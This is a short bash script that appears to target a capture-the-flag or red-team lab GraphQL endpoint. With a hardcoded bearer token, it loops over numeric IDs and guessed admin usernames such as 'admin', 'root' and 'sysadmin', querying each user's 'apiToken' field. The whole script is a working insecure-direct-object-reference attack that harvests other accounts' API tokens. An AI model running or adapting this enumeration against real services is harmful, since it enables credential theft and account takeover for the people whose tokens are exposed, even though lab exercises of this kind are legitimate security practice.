#!/bin/bash
TOKEN="coop_4eff618993d6c930ca88893225f669f32782ae79"
URL="http://a0d3220d-6f6a-4213-8a3b-2a6c52bfaa04.red.cyberkent.uz/graphql"
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 admin administrator root sysadmin coop-admin admin-1; do
  R=$(curl -s -m 8 -X POST "$URL" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
    --data-raw "{\"query\":\"query{user(id:\\\"$i\\\"){id username tier apiToken}}\"}")
  echo "$i -> $R"
done
